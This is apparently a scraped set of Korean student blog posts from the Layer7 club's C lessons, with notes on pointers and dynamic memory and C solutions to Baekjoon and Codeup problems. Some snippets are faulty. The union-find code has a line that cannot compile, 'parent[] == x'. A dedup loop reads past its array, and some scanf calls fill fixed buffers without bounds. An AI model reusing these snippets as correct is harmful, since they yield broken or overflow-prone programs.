\u0026lt; n; i++) { for (int j = 0; j \u0026lt; n; j++) { if (stu[i].score == sorted[j].score) { stu[i].rank = sorted[j].rank; } } } for (int i = 0; i \u0026lt; n; i++) { printf(\u0026#34;%d %d\\n\u0026#34;, stu[i].score, stu[i].rank); } return 0; } 창작 문제 | 회계 관리 시스템 문제 Layer7는 동아리 부원들의 지출 내역을 정리하고자 한다.\n부원마다 여러 건의 지출 내역이 있으며, 각 지출은 항목명, 금액, 날짜로 이루어져 있다.\n모든 부원은 정보를 입력받아 각 회원의 총 지출을 출력하고, 가장 지출이 많은 부원을 찾아 출력하는 프로그램을 작성하시오.\n풀이 지출 내역을 저장할 구조체인 details와 지출 내역을 비롯한 회원들의 정보를 저장할 info 구조체를 선언하였다.\n회원 수를 입력받아 동적으로 user 구조체의 메모리를 할당해주었고, 각각의 정보들을 입력받았다.\n만약 지출 내역 수가 1 이상이면 지출 내역을 입력받고, 각각의 회원들의 총 지출 금액을 sum이라는 멤버에 저장하였다.\nsum 멤버를 기준으로 내림차순으로 정렬한 뒤 최고 지출자를 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; typedef struct { char item[100]; int price; char date[10]; } details; typedef struct { char name[100]; int id; int num; int sum; details *detail; } info; void sort(info user[], int n) { info tmp; for (int i = 0; i \u0026lt; n; i++) { for (int j = i; j \u0026lt; n; j++) { if (user[j].sum \u0026gt; user[i].sum) { tmp = user[j]; user[j] = user[i]; user[i] = tmp; } } } } int main() { int n; printf(\u0026#34;회원 수를 입력하세요 : \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); info *user = (info *)malloc(n * sizeof(info)); for (int i = 0; i \u0026lt; n; i++) { printf(\u0026#34;\\n[%d번째 회원 정보 입력 ]\\n\u0026#34;, i + 1); printf(\u0026#34;이름 : \u0026#34;); scanf(\u0026#34;%s\u0026#34;, (user + i) -\u0026gt; name); printf(\u0026#34;학번 : \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;((user + i) -\u0026gt; id)); printf(\u0026#34;지출 내역 수 : \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;((user + i) -\u0026gt; num)); if ((user + i) -\u0026gt; num \u0026gt; 0) { (user + i) -\u0026gt; detail = (details *)malloc(((user + i) -\u0026gt; num) * sizeof(details)); for (int j = 0; j \u0026lt; (user + i) -\u0026gt; num; j++) { printf(\u0026#34;\\n\\t[%d번째 지출 내역]\\n\u0026#34;, j + 1); printf(\u0026#34;\\t항목명 : \u0026#34;); scanf(\u0026#34;%s\u0026#34;, ((user + i) -\u0026gt; detail + j) -\u0026gt; item); printf(\u0026#34;\\t금액 : \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;(((user + i) -\u0026gt; detail + j) -\u0026gt; price)); printf(\u0026#34;\\t날짜 (YYYY-MM-DD): \u0026#34;); scanf(\u0026#34;%s\u0026#34;, (((user + i) -\u0026gt; detail + j) -\u0026gt; date)); } } } for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; (user + i) -\u0026gt; num; j++) { (user + i) -\u0026gt; sum += ((user + i) -\u0026gt; detail + j) -\u0026gt; price; } } sort(user, n); for (int i = 0; i \u0026lt; n; i++) { printf(\u0026#34;\\n회원 : %s | 학번 : %d | 총 지출 : %d원\\n\u0026#34;, (user + i) -\u0026gt; name, (user + i) -\u0026gt; id, (user + i) -\u0026gt; sum); } printf(\u0026#34;\\n[최고 지출자]\\n\u0026#34;); printf(\u0026#34;이름 : %s\\n\u0026#34;, user -\u0026gt; name); printf(\u0026#34;학번 : %d\\n\u0026#34;, user -\u0026gt; id); printf(\u0026#34;총 지출 : %d\u0026#34;, user -\u0026gt; sum); free(user); return 0; } ","date":"2025-04-16T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-c%EC%96%B8%EC%96%B4-5%EC%B0%A8%EC%8B%9C/","title":"Layer7 C언어 5차시"},{"content":"수업 내용 정리 포인터란? 변수 : 자신의 자료형에 맞는 값을 저장\n포인터 변수 : 기존과 달리, 메모리 주소를 저장\n메모리 주소 : 실제 컴퓨터에 저장되는 메모리 영역을 구분 짓는 값 포인터를 사용하는 이유 변수명이 같아도 함수마다 다른 메모리에 별도의 저장 공간을 확보. -\u0026gt; 포인터를 사용하여 다른 함수에서도 사용할 수 있도록 함.\n메모리 구조 메모리 공간을 네 가지로 분류.\n코드 영역 (code section) 소스 코드 저장\n데이터 영역 (data section) 전역, 정적 변수 저장\n힙 영역 (heap section) 동적 할당 변수 저장\n스택 영역 (stack section) 지역 변수, 매개 변수 저장\n전역 변수 프로그램의 어디서든 접근 가능한 변수 (데이터 영역에 저장)\n프로그램 시작과 동시에 메모리에 할당.\n지역 변수 프로그램에서 특정 블록에서만 접근할 수 있는 변수. (스택 영역에 저장)\n함수가 실행될 때마다 메모리에 할당. 함수 종료 시 메모리에서 해제.\n포인터 연산자 * : 역참조 연산자로, 메모리에 저장된 값에 접근할 수 있음. \u0026amp; : 주소 연산자로, 변수의 메모리 주소를 가져옴.\n동적 메모리 할당이란? 프로그램 실행 중 원하는 크기 만큼 메모리를 할당하여 사용.\n동적 메모리 할당 함수 malloc() : 인자값 크기만큼 메모리 할당\nfree() : 메모리 할당한 변수 해제\n백준 문제 정리 25703* 재귀 함수 : 11729*\n25703 | 포인터 공부 문제 링크\n문제 용모는 오늘 객체지향프로그래밍1 시간에 포인터에 대해 배웠다. 포인터란, 프로그래밍 언어에서 다른 변수, 혹은 그 변수의 메모리 공간주소를 가리키는 변수를 의미한다.\nC/C++에서 포인터는 (자료형) (변수명)으로 선언할 수 있으며 값은 \u0026amp;(이미 선언된 변수명)으로 지정할 수 있다. 이때 변수 선언에서 \u0026lsquo;\u0026rsquo; 기호는 이 변수가 포인터임을 의미하고, \u0026lsquo;\u0026amp;\u0026rsquo; 기호는 변수의 메모리 주소값을 의미한다.\n예를 들어, int형 변수 a에 대한 포인터 ptr을 다음과 같이 선언할 수 있다. 이때 ptr은 a가 저장된 메모리의 주소를 가리키고 있다.\n1 2 int a; int *ptr = \u0026amp;a; 또한 포인터의 포인터를 선언하는 식으로 다중 포인터를 선언하는 것이 가능하다. int형 변수 a에 대해 4중 포인터를 만들려 하는 경우 다음과 같이 코드를 작성해야 한다. 이중 포인터인 ptr2는 a의 포인터인 ptr의 주소를, 삼중 포인터인 ptr3는 이중 포인터인 ptr2의 주소를 가리키는 식으로 특정 변수에 대해 다중 포인터를 끝없이 선언할 수 있다.\n1 2 3 4 5 int a; int *ptr = \u0026amp;a; int **ptr2 = \u0026amp;ptr; int ***ptr3 = \u0026amp;ptr2; int ****ptr4 = \u0026amp;ptr3; 용모는 int형 변수 a에 대해 N중 포인터를 선언하는 코드를 작성할 때 필요한 변수 선언문들을 작성해야 하는 과제를 받았다. 이때 위 다중 포인터 선언 예시와 같이 각 포인터 변수의 이름은 \u0026ldquo;ptr\u0026rdquo;, \u0026ldquo;ptr2\u0026rdquo;, \u0026hellip;, \u0026ldquo;ptrN\u0026rdquo; (N은 수)이 되어야 하고, 코드 형식은 위 예시와 동일해야 한다.\n하지만 공부가 너무 싫고 게임을 너무나 좋아했던 용모는 코드를 치는 시간이 아까웠기 때문에 과제의 코드를 대신 출력해주는 프로그램을 작성하고 게임을 하러 가기로 하였다.\n용모가 작성할 프로그램을 여러분도 작성해보자.\n풀이 특정한 패턴이 없는 1 ~ 3번 줄까지는 그대로 출력하고, 나머지 줄부터는 반복문을 통해 포인터 중첩 정도 만큼 별을 출력하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;stdio.h\u0026gt; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 0; i \u0026lt;= n; i++) { switch (i) { case 0: printf(\u0026#34;int a;\\n\u0026#34;); break; case 1: printf(\u0026#34;int *ptr = \u0026amp;a;\\n\u0026#34;); break; case 2: printf(\u0026#34;int **ptr2 = \u0026amp;ptr;\u0026#34;); break; default: printf(\u0026#34;\\nint \u0026#34;); for (int j = 0; j \u0026lt; i; j++) { printf(\u0026#34;*\u0026#34;); } printf(\u0026#34;ptr%d = \u0026amp;ptr%d;\u0026#34;, i, i - 1); } } return 0; } 11729 | 하노이 탑 이동 순서 문제 링크\n문제 세 개의 장대가 있고 첫 번째 장대에는 반경이 서로 다른 n개의 원판이 쌓여 있다. 각 원판은 반경이 큰 순서대로 쌓여있다. 이제 수도승들이 다음 규칙에 따라 첫 번째 장대에서 세 번째 장대로 옮기려 한다.\n한 번에 한 개의 원판만을 다른 탑으로 옮길 수 있다. 쌓아 놓은 원판은 항상 위의 것이 아래의 것보다 작아야 한다. 이 작업을 수행하는데 필요한 이동 순서를 출력하는 프로그램을 작성하라. 단, 이동 횟수는 최소가 되어야 한다.\n풀이 n개의 원판을 목적지 기둥으로 옮기는 메인 아이디어는 n - 1개의 원판을 중간 기둥으로 옮긴 다음에 목적지 기둥으로 옮기는 것이다. 이를 재귀 함수로 구현하였다.\n따라서 hanoi() 함수를 보면, hanoi(n - 1, from, to, via); 코드를 통해 n - 1개의 원판을 세 번째 기둥을 보조 기둥으로 이용하여 두 번째 기둥으로 옮기고,\nprintf(\u0026quot;%d %d\\n\u0026quot;, from, to); 코드를 통해 가장 큰 원판을 세 번째 기둥으로 옮기고,\nhanoi(n - 1, via, from, to); 함수를 통해 두 번째 기둥으로 옮긴 n - 1 개의 원판을 세번째 기둥으로 옮기도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;stdio.h\u0026gt; void hanoi(int n, int from, int via, int to) { if (n == 1) { printf(\u0026#34;%d %d\\n\u0026#34;, from, to); return; } hanoi(n - 1, from, to, via); printf(\u0026#34;%d %d\\n\u0026#34;, from, to); hanoi(n - 1, via, from, to); } int main() { int n, sum = 1; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 0; i \u0026lt; n; i++) { sum *= 2; } printf(\u0026#34;%d\\n\u0026#34;, sum - 1); hanoi(n, 1, 2, 3); return 0; } 코드업 문제 정리 1810*, 1581*\n1810 | 부분 문자열 문제 링크\n문제 어떤 문자열에서 부분문자열을 추출하여 출력하는 프로그램을 작성하시오.\n단 배열 대신 동적메모리 할당방법을 사용하시오.\n풀이 str이라는 변수의 포인터에 100byte 크기의 메모리 공간을 할당한 뒤, 문자열과 두 정수를 입력받아 두 정수 사이의 인덱스 만큼 출력하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { char *str = malloc(100); int a, b; scanf(\u0026#34;%s %d %d\u0026#34;, str, \u0026amp;a, \u0026amp;b); for (int i = a; i \u0026lt;= b; i++) { printf(\u0026#34;%c\u0026#34;, str[i - 1]); } free(str); return 0; } 1581 | swap 함수 만들기 문제 링크\n문제 이 문제는 두 변수의 값을 바꾸는 함수를 구현하는 문제입니다.\n다음 조건을 참고해서 함수 본체만 작성해서 제출하시기 바랍니다.\n함수명 : myswap\n매개 변수(parameter) : 정수형 포인터 변수 변수 2개(매개변수를 반드시 int∗로 사용)\n반환 형(return type) : 없음(void)\n함수 내용 : 첫 번째 포인터가 가리키는 변수의 값이 두 번째 포인터가 가리키는 변수의 값보다 클 경우 두 값을 서로 바꾼다.\n풀이 두 변수의 포인터를 인자로 받아 첫 번째 값이 더 크다면 역참조를 통해 두 주소의 값을 서로 바꿔주었다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 #include \u0026lt;stdio.h\u0026gt; void myswap(int* a, int* b) { int tmp = 0; if (*a \u0026gt; *b) { tmp = *a; *a = *b; *b = tmp; } } main() { int a, b; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a, \u0026amp;b); myswap(\u0026amp;a, \u0026amp;b); printf(\u0026#34;%d %d\u0026#34;, a, b); } 창작 문제 문제 풀이 입력받은 N의 크기 만큼 메모리를 할당하여 배열을 선언하였다. 정렬 알고리즘을 통해 크기 순으로 정렬하고, 반복문을 통해 i번째 값과 i + 1번째 값이 다른 경우만 출력되게 하여 중복을 방지하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { int N; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); int *arr = (int *) malloc(N * sizeof(int)); for (int i = 0; i \u0026lt; N; i++) { scanf(\u0026#34;%d\u0026#34;, arr + i); } for (int i = 0; i \u0026lt; N - 1; i++) { for (int j = i + 1; j \u0026lt; N; j++) { if (*(arr + i) \u0026gt; *(arr + j)) { int tmp = *(arr + i); *(arr + i) = *(arr + j); *(arr + j) = tmp; } } } for (int i = 0; i \u0026lt; N; i++) { if (*(arr + i) != *(arr + i + 1)) { printf(\u0026#34;%d \u0026#34;, *(arr + i)); } } return 0; } 10775 | 공항 (협력 과제) 문제 링크\n문제 오늘은 신승원의 생일이다.\n박승원은 생일을 맞아 신승원에게 인천국제공항을 선물로 줬다.\n공항에는 G개의 게이트가 있으며 각각은 1에서 G까지의 번호를 가지고 있다.\n공항에는 P개의 비행기가 순서대로 도착할 예정이며, 당신은 i번째 비행기를 1번부터 gi (1 ≤ gi ≤ G) 번째 게이트중 하나에 영구적으로 도킹하려 한다. 비행기가 어느 게이트에도 도킹할 수 없다면 공항이 폐쇄되고, 이후 어떤 비행기도 도착할 수 없다.\n신승원은 가장 많은 비행기를 공항에 도킹시켜서 박승원을 행복하게 하고 싶어한다. 승원이는 비행기를 최대 몇 대 도킹시킬 수 있는가?\n풀이 풀이 시작 전 union-find 알고리즘이 사용된다는 정보를 알고 학습 후에 풀이하였습니다.\n게이트 개수인 G를 입력받아, 그 값 만큼 parent 배열의 각 인덱스를 i로 초기화 해주었다.\n이후 gi를 입력받아, find() 함수를 통해 gi와 가장 가까운 값을 반환하도록 하였고, Union() 함수를 통해 이전 노드와 연결되도록 하여 도킹을 구현하였다.\n따라서 만약 같은 값의 gi가 입력되면 이전 노드의 값이 반환될 것이고, 그 경우를 카운트하여 find(gi)의 값이 0이면(도킹할 수 있는 게이트가 없을 때) 반복을 멈추고 출력하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #include \u0026lt;stdio.h\u0026gt; int parent[100001]; int find(int x) { if (parent[] == x) return x; return parent[x] = find(parent[x]); } void Union(int a, int b) { a = find(a); b = find(b); parent[a] = b; } int main() { int G, P, gi; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;G, \u0026amp;P); for (int i = 0; i \u0026lt;= G; i++) { parent[i] = i; } int cnt = 0; for (int i = 0; i \u0026lt; P; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;gi); int D = find(gi); if (D == 0) break; Union(D, D - 1); cnt++; } printf(\u0026#34;%d\\n\u0026#34;, cnt); return 0; } ","date":"2025-04-12T00:00:00Z","permalink":"https://t43w00.netlify.app/p/layer7-c%EC%96%B8%EC%96%B4-4%EC%B0%A8%EC%8B%9C/","title":"Layer7 C언어 4차시"},{"content":"백준 문제 정리 1차원 배열 : 10807, 10818*, 10810* 2차원 배열 : 2738, 10798*, 2563*\n10807 문제 링크\n문제 총 N개의 정수가 주어졌을 때, 정수 v가 몇 개인지 구하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #include \u0026lt;stdio.h\u0026gt; int main() { int N, v, cnt = 0; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); int arr[N]; for (int i = 0; i \u0026lt; N; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;arr[i]); } scanf(\u0026#34;%d\u0026#34;, \u0026amp;v); for (int i = 0; i \u0026lt; N; i++) { if (arr[i] == v) { cnt++; } } printf(\u0026#34;%d\u0026#34;, cnt); return 0; } 10818 | 최소, 최대 문제 링크\n문제 N개의 정수가 주어진다. 이때, 최솟값과 최댓값을 구하는 프로그램을 작성하시오.\n풀이 반복문을 통해 arr 배열에 각 원소들을 입력받은 뒤, 각각의 원소들을 비교하여 가장 작은 값을 tmp 변수에 저장하여 출력하였다. 가장 큰 값도 같은 방법으로 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;stdio.h\u0026gt; int main() { int N, tmp; scanf(\u0026#34;%d\u0026#34;, \u0026amp;N); int arr[N]; for (int i = 0; i \u0026lt; N; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;arr[i]); } tmp = arr[0]; for (int i = 0; i \u0026lt; N; i++) { if (arr[i] \u0026lt; tmp) { tmp = arr[i]; } } printf(\u0026#34;%d \u0026#34;, tmp); tmp = -1000001; for (int i = 0; i \u0026lt; N; i++) { if (arr[i] \u0026gt; tmp) { tmp = arr[i]; } } printf(\u0026#34;%d\u0026#34;, tmp); return 0; } 10810 | 공 넣기 문제 링크\n문제 도현이는 바구니를 총 N개 가지고 있고, 각각의 바구니에는 1번부터 N번까지 번호가 매겨져 있다. 또, 1번부터 N번까지 번호가 적혀있는 공을 매우 많이 가지고 있다. 가장 처음 바구니에는 공이 들어있지 않으며, 바구니에는 공을 1개만 넣을 수 있다.\n도현이는 앞으로 M번 공을 넣으려고 한다. 도현이는 한 번 공을 넣을 때, 공을 넣을 바구니 범위를 정하고, 정한 바구니에 모두 같은 번호가 적혀있는 공을 넣는다. 만약, 바구니에 공이 이미 있는 경우에는 들어있는 공을 빼고, 새로 공을 넣는다. 공을 넣을 바구니는 연속되어 있어야 한다.\n공을 어떻게 넣을지가 주어졌을 때, M번 공을 넣은 이후에 각 바구니에 어떤 공이 들어 있는지 구하는 프로그램을 작성하시오.\n풀이 baskets 배열을 0으로 초기화 한 뒤에, 반복문을 통해 배열에 입력받았다. 이후 M번 만큼 I, J, K를 입력받아 I부터 J번째 인덱스에 K 값을 저장해주었다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #include \u0026lt;stdio.h\u0026gt; int main() { int N, M, I, J, K; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;N, \u0026amp;M); int baskets[N]; for (int i = 0; i \u0026lt; N; i++) { baskets[i] = 0; } for (int i = 0; i \u0026lt; M; i++) { scanf(\u0026#34;%d %d %d\u0026#34;, \u0026amp;I, \u0026amp;J, \u0026amp;K); for (int j = I - 1; j \u0026lt;= J - 1; j++) { baskets[j] = K; } } for (int i = 0; i \u0026lt; N; i++) { printf(\u0026#34;%d \u0026#34;, baskets[i]); } return 0; } 2738 | 행렬 덧셈 문제 링크\n문제 N*M크기의 두 행렬 A와 B가 주어졌을 때, 두 행렬을 더하는 프로그램을 작성하시오.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 #include \u0026lt;stdio.h\u0026gt; int main() { int N, M; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;N, \u0026amp;M); int arr1[N][M]; int arr2[N][M]; for (int i = 0; i \u0026lt; N; i++) { for (int j = 0; j \u0026lt; M; j++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;arr1[i][j]); } } for (int i = 0; i \u0026lt; N; i++) { for (int j = 0; j \u0026lt; M; j++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;arr2[i][j]); arr2[i][j] += arr1[i][j]; } } for (int i = 0; i \u0026lt; N; i++) { for (int j = 0; j \u0026lt; M; j++) { printf(\u0026#34;%d \u0026#34;, arr2[i][j]); } printf(\u0026#34;\\n\u0026#34;); } return 0; } 10798 | 세로읽기 문제 링크\n문제 아직 글을 모르는 영석이가 벽에 걸린 칠판에 자석이 붙어있는 글자들을 붙이는 장난감을 가지고 놀고 있다.\n이 장난감에 있는 글자들은 영어 대문자 ‘A’부터 ‘Z’, 영어 소문자 ‘a’부터 ‘z’, 숫자 ‘0’부터 ‘9’이다. 영석이는 칠판에 글자들을 수평으로 일렬로 붙여서 단어를 만든다. 다시 그 아래쪽에 글자들을 붙여서 또 다른 단어를 만든다. 이런 식으로 다섯 개의 단어를 만든다. 아래 그림 1은 영석이가 칠판에 붙여 만든 단어들의 예이다.\nA A B C D D a f z z 0 9 1 2 1 a 8 E W g 6 P 5 h 3 k x \u0026lt;그림 1\u0026gt;\n한 줄의 단어는 글자들을 빈칸 없이 연속으로 나열해서 최대 15개의 글자들로 이루어진다. 또한 만들어진 다섯 개의 단어들의 글자 개수는 서로 다를 수 있다.\n심심해진 영석이는 칠판에 만들어진 다섯 개의 단어를 세로로 읽으려 한다. 세로로 읽을 때, 각 단어의 첫 번째 글자들을 위에서 아래로 세로로 읽는다. 다음에 두 번째 글자들을 세로로 읽는다. 이런 식으로 왼쪽에서 오른쪽으로 한 자리씩 이동 하면서 동일한 자리의 글자들을 세로로 읽어 나간다. 위의 그림 1의 다섯 번째 자리를 보면 두 번째 줄의 다섯 번째 자리의 글자는 없다. 이런 경우처럼 세로로 읽을 때 해당 자리의 글자가 없으면, 읽지 않고 그 다음 글자를 계속 읽는다. 그림 1의 다섯 번째 자리를 세로로 읽으면 D1gk로 읽는다.\n그림 1에서 영석이가 세로로 읽은 순서대로 글자들을 공백 없이 출력하면 다음과 같다:\nAa0aPAf985Bz1EhCz2W3D1gkD6x\n칠판에 붙여진 단어들이 주어질 때, 영석이가 세로로 읽은 순서대로 글자들을 출력하는 프로그램을 작성하시오.\n풀이 5 * 15 크기의 배열을 만들고 각 줄에 문자열을 입력받았다. 빈 공간의 경우에는 # 문자를 저장해주었다. 반복문을 통해 세로로 출력하도록 하였는데, # 문자나 널 문자가 아닌 경우에만 출력하도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #include \u0026lt;stdio.h\u0026gt; int main() { char strings[5][15]; for (int i = 0; i \u0026lt; 5; i++) { for (int j = 0; j \u0026lt; 15; j++) { strings[i][j] = \u0026#39;#\u0026#39;; } } for (int i = 0; i \u0026lt; 5; i++) { scanf(\u0026#34;%s\u0026#34;, strings[i]); } for (int i = 0; i \u0026lt; 15; i++) { for (int j = 0; j \u0026lt; 5; j++) { if (strings[j][i] != \u0026#39;#\u0026#39; \u0026amp;\u0026amp; strings[j][i] != \u0026#39;\\0\u0026#39;) { printf(\u0026#34;%c\u0026#34;, strings[j][i]); } } } return 0; } 2563 | 색종이 문제 링크\n문제 가로, 세로의 크기가 각각 100인 정사각형 모양의 흰색 도화지가 있다. 이 도화지 위에 가로, 세로의 크기가 각각 10인 정사각형 모양의 검은색 색종이를 색종이의 변과 도화지의 변이 평행하도록 붙인다. 이러한 방식으로 색종이를 한 장 또는 여러 장 붙인 후 색종이가 붙은 검은 영역의 넓이를 구하는 프로그램을 작성하시오.\n풀이 100 * 100 크기의 배열을 만들고 0으로 초기화하였다. n번 만큼 x와 y를 입력받아 반복문을 통해 10 * 10 크기의 정사각형에 1을 더해주었다. 이후 반복문을 통해 배열에 0 이상인 값이 있는 경우에는 cnt를 세어 출력하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #include \u0026lt;stdio.h\u0026gt; int main() { int n, x, y, cnt =0; int area[100][100] = {0}; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;x, \u0026amp;y); for (int j = x; j \u0026lt; x + 10; j++) { for (int k = y; k \u0026lt; y + 10; k++) { area[k][j] += 1; } } } for (int i = 0; i \u0026lt; 100; i++) { for (int j = 0; j \u0026lt; 100; j++) { if (area[i][j] \u0026gt; 0) { cnt++; } } } printf(\u0026#34;%d\u0026#34;, cnt); return 0; } Codeup 문제 정리 1차원 배열 : 1093, 1094, 1095 2차원 배열 : 1460*, 1466, 1470 함수 : 1532, 1535*, 1538, 1548, 1580 재귀함수 : 1852, 1859*, 1860, 1912, 1915, 1920*, 1954\n1093 | 이상한 출석 번호 부르기1 문제 링크\n문제 정보 선생님은 수업을 시작하기 전에 이상한 출석을 부른다.\n선생님은 출석부를 보고 번호를 부르는데, 학생들의 얼굴과 이름을 빨리 익히기 위해 번호를 무작위(랜덤)으로 부른다.\n그리고 얼굴과 이름이 잘 기억되지 않는 학생들은 번호를 여러 번 불러 이름과 얼굴을 빨리 익히려고 하는 것이다.\n출석 번호를 n번 무작위로 불렀을 때, 각 번호(1 ~ 23)가 불린 횟수를 각각 출력해보자.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;stdio.h\u0026gt; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); int input[n]; int num[23]; for (int i = 0; i \u0026lt; 23; i++) { num[i] = 0; } for (int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;input[i]); } for (int i = 0; i \u0026lt; n; i++) { num[input[i]-1]++; } for (int i = 0; i \u0026lt; 23; i++) { printf(\u0026#34;%d \u0026#34;, num[i]); } return 0; } 1094 | 이상한 출석 번호 부르기2 문제 링크\n문제 정보 선생님은 수업을 시작하기 전에 이상한 출석을 부른다.\n학생들의 얼굴과 이름을 빨리 익히기 위해 번호를 무작위(랜덤)으로 부르는데, 영일이는 선생님이 부른 번호들을 기억하고 있다가 거꾸로 불러보는 것을 해보고 싶어졌다.\n출석 번호를 n번 무작위로 불렀을 때, 부른 번호를 거꾸로 출력해 보자.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); int input[n]; for (int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;input[i]); } for (int i = n - 1; i \u0026gt;= 0; i--) { printf(\u0026#34;%d \u0026#34;, input[i]); } return 0; } 1095 | 이상한 출석 번호 부르기3 문제 링크\n문제 정보 선생님은 오늘도 이상한 출석을 부른다.\n영일이는 오늘도 다른 생각을 해보았다. 출석 번호를 다 부르지는 않은 것 같은데\u0026hellip; 가장 빠른 번호가 뭐였지?\n출석 번호를 n번 무작위로 불렀을 때, 가장 빠른 번호를 출력해 보자.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;stdio.h\u0026gt; int main() { int n, min = 23; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); int input[n]; for (int i = 0; i \u0026lt; n; i++) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;input[i]); if (input[i] \u0026lt; min) { min = input[i]; } } printf(\u0026#34;%d\u0026#34;, min); return 0; } 1460 | 2차원 배열 순서대로 채우기 1-1 문제 링크\n문제 다음과 같은 n*n 배열 구조를 출력해보자.\n입력이 3인 경우 다음과 같이 출력한다. 1 2 3 4 5 6 7 8 9\n입력이 5인 경우는 다음과 같이 출력한다. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25\n입력이 n인 경우의 2차원 배열을 출력해보자.\n풀이 n * n 크기의 배열을 선언한 뒤, 이중 반복문을 통해 배열의 각각의 공간에 num을 저장한 뒤 출력하고 num을 증가시키는 것을 반복하였다. 한 행이 끝나면 줄바꿈이 되도록 하였다.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;stdio.h\u0026gt; int main() { int n; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); int arr[n][n]; int num = 1; for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; n; j++) { arr[i][j] = num; printf(\u0026#34;%d \u0026#34;, arr[i][j]); num++; } printf(\u0026#34;\\n\u0026#34;); } return 0; } 1466 | 2차원 배열 순서대로 채우기 1-7 문제 링크\n문제 다음과 같은 n*m 배열 구조를 출력해보자.\n입력이 3 4인 경우 다음과 같이 출력한다. 12 9 6 3 11 8 5 2 10 7 4 1\n입력이 4 5인 경우는 다음과 같이 출력한다. 20 16 12 8 4 19 15 11 7 3 18 14 10 6 2 17 13 9 5 1\n입력이 n m인 경우의 2차원 배열을 출력해보자.\n코드 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #include \u0026lt;stdio.h\u0026gt; int main() { int n, m; scanf(\u0026#34;%d %d\u0026#34;, \u0026amp;n, \u0026amp;m); int arr[n][m]; for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; m; j++) { arr[i][j] = (n * (m - j)) - i; printf(\u0026#34;%d \u0026#34;, arr[i][j]); } printf(\u0026#34;\\n\u0026#34;); } return 0; } 1470 | 2차원 배열 지그재그 채우기 2-3 문제 링크\n문제 다음과 같은 n*n 배열 